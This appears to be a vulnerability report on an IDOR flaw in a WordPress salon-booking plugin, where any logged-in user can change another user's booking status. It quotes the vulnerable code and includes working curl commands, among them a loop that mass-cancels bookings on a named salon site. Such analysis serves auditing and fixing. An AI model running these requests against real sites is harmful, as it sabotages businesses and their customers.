# IDOR Vulnerability Analysis - SetBookingStatus

## Question: Are Booking IDs Easy to Enumerate?

### Answer: YES - Highly Enumerable

## Evidence

### 1. Booking IDs are Sequential WordPress Post IDs

```php
// Bookings are stored as custom post type 'sln_booking'
const POST_TYPE_BOOKING = 'sln_booking';

// WordPress assigns sequential IDs: 1, 2, 3, 4, 5...
wp_insert_post() // Returns next available ID
```

**How sequential are they?**
- If site has 5 pages and 100 bookings
- Booking IDs might be: 6, 7, 8, 9... 105
- Very predictable!

### 2. Booking IDs Exposed in User's "My Account" Page

**File:** `views/shortcode/salon_my_account/_salon_my_account_details_table_rows.php:6`

```html
<h4 class="sln-account__card__header__el">
    <?php echo $item['id'] ?>  <!-- ⚠️ Shows numeric ID! -->
    <small>Booking ID</small>
</h4>
```

**What this means:**
- User creates booking, sees "Booking ID: 123"
- Knows IDs around 120-130 probably exist
- Can target those IDs

### 3. No Ownership Check in SetBookingStatus

```php
public function execute()
{
    if (!is_user_logged_in()) {
        return array('redirect' => wp_login_url());
    }
    
    // ⚠️ Uses integer ID, not secure unique ID!
    $booking = $plugin->createBooking(intval($_POST['booking_id']));
    
    // ⚠️ NO CHECK: is this user the booking owner?
    $booking->setStatus(wp_unslash($_POST['status']));
}
```

### 4. createBooking() Has NO Authorization

```php
public function createBooking($booking)
{
    if (is_int($booking)) {
        $booking = get_post($booking);  // ⚠️ Just fetches ANY post
    }
    return new SLN_Wrapper_Booking($booking);
    // ⚠️ No check: does current user own this booking?
}
```

**WordPress `get_post()` behavior:**
- Returns post regardless of author
- No permission checks
- Only validates post exists

## Attack Scenario

### Scenario: Competitor Sabotage

**Setup:**
- Alice's Salon uses this plugin
- Competitor Bob wants to disrupt business
- Bob creates ONE legitimate booking to get an account

**Attack:**

```bash
# Step 1: Bob logs in and creates booking #457
# He sees: "Booking ID: 457" in his account

# Step 2: Bob guesses nearby IDs exist (455, 456, 458, 459...)
# He targets all bookings for tomorrow

# Step 3: Bob cancels everyone's bookings
for id in {450..500}; do
  curl -X POST 'https://alicesalon.com/wp-admin/admin-ajax.php' \
    -H 'Cookie: wordpress_logged_in_...' \
    --data "action=salon&method=SetBookingStatus&booking_id=$id&status=sln-b-canceled"
  sleep 0.5
done
```

**Result:**
- 50 bookings canceled
- Customers receive cancellation emails
- Alice loses revenue
- Reputation damage

### Scenario: Status Manipulation

```bash
# Attacker confirms own canceled booking without paying
curl -X POST 'https://site.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_...' \
  --data "action=salon&method=SetBookingStatus&booking_id=123&status=sln-b-confirmed"
```

## Is This Actually Exploitable?

### ✅ YES - Highly Exploitable

**Requirements:**
1. ✅ Attacker needs account (trivial - self-register)
2. ✅ IDs are enumerable (sequential + displayed to users)
3. ✅ No ownership check (confirmed in code)
4. ✅ No rate limiting (can spam requests)

**Difficulty:** LOW
**Impact:** HIGH

## Additional Evidence: Unique ID System Bypassed

The plugin HAS a secure ID system but doesn't use it here:

```php
public function getUniqueId()
{
    $id = $this->getMeta('uniqid');
    if (!$id) {
        $id = md5(uniqid().$this->getId());  // Random hash
        $this->setMeta('uniqid', $id);
    }
    return $this->getId().'-'.$id;  // Returns "123-abc456def789"
}
```

**But SetBookingStatus ignores this:**
```php
// Uses integer ID ❌
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// Should use unique ID ✅
$booking = $plugin->createBooking($_POST['booking_id']); // Would validate hash
```

## Proof of Concept

### Safe PoC (Non-Destructive)

```bash
# 1. Create two test accounts
# 2. User A creates booking (note ID: 100)
# 3. Log in as User B
# 4. Attempt to access User A's booking

curl -X POST 'http://localhost/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_user_b...' \
  --data 'action=salon&method=SetBookingStatus&booking_id=100&status=sln-b-confirmed'

# Expected (vulnerable): Success - User B changed User A's booking
# Expected (fixed): Error - Unauthorized
```

## Conclusion

**Is IDOR exploitable?** ✅ **ABSOLUTELY YES**

- Sequential IDs: ✅ Confirmed
- IDs exposed to users: ✅ Confirmed  
- No ownership check: ✅ Confirmed
- Actual exploitation: ✅ Trivial

**Severity:** CRITICAL (P0) - Confirmed
**CVSS:** 8.1 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges: Low (any user account)
- User Interaction: None
- Scope: Unchanged
- Confidentiality: None
- Integrity: High (modify other users' bookings)
- Availability: High (can cancel all bookings)
